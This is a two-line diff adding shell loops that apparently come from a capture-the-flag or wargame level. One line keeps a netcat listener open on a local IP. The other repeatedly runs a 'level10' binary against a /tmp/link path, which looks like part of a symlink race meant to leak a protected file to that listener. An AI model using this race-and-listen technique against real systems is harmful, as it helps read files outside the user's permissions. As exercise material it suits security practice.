@@ -1,0 +1,2 @@
+while true; do nc -l 192.168.99.100 6969; done
+while true; do ./level10 /tmp/link 192.168.99.100; done
